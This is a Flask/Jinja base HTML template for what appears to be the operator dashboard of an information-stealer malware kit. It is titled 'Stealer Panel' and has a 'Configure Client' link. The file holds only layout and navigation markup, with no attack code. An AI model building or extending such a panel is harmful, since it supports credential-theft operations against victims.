<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>{% block title %}Stealer Panel{% endblock %}</title>
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.1.3/dist/css/bootstrap.min.css" rel="stylesheet" integrity="sha384-1BmE4kWBq78iYhFldvKuhfTAU6auU8tT94WrHftjDbrCEXSU1oBoqyl2QvZ6jIW3" crossorigin="anonymous">
    <link rel="stylesheet" href="{{ url_for('static', filename='style.css') }}"> 
</head>
<body>
    <header>
        <div class="container d-flex flex-column flex-md-row align-items-center pb-3 mb-4 mt-4 border-bottom">
        <a href="/" class="d-flex align-items-center text-dark text-decoration-none">
            <span class="fs-4 text-white">lovedbySky {% block page_name %}{% endblock %}</span>
        </a>
        <nav class="d-inline-flex mt-2 mt-md-0 ms-md-auto">
			<a class="me-3 py-2 text-white text-decoration-none btn btn-success" href="{{ url_for('index')}}">Home</a>
			<a class="me-3 py-2 text-white text-decoration-none btn btn-success" href="{{ url_for('create_client')}}">Configure Client</a>
			<a class="me-3 py-2 text-dark text-decoration-none btn btn-warning" href="{{ url_for('logout')}}">Logout</a>
			<a class="me-3 py-2 text-white text-decoration-none btn btn-success" href="https://github.com/lovedbySky">GitHub</a>
        </nav>
    </div>
    </header>

    <div class="container">
        {% block content %}

        {% endblock %}
    </div>
    
    <footer class="mt-5 pt-5">
        <div class="container">
            <footer>
              <ul class="nav justify-content-center border-bottom pb-3 mb-3">
                <li class="nav-item"><a href="{{ url_for('create_client') }}" class="nav-link px-2 text-muted">Client</a></li>
                <li class="nav-item"><a href="{{ url_for('index') }}" class="nav-link px-2 text-muted">Home</a></li>
                <li class="nav-item"><a href="https://github.com/lovedbySky" class="nav-link px-2 text-muted">GitHub</a></li>
              </ul>
              <p class="text-center text-muted">Â© 2022 Stealer by lovedBySky, Inc</p>
            </footer>
          </div>
    </footer>
</body>
</html>
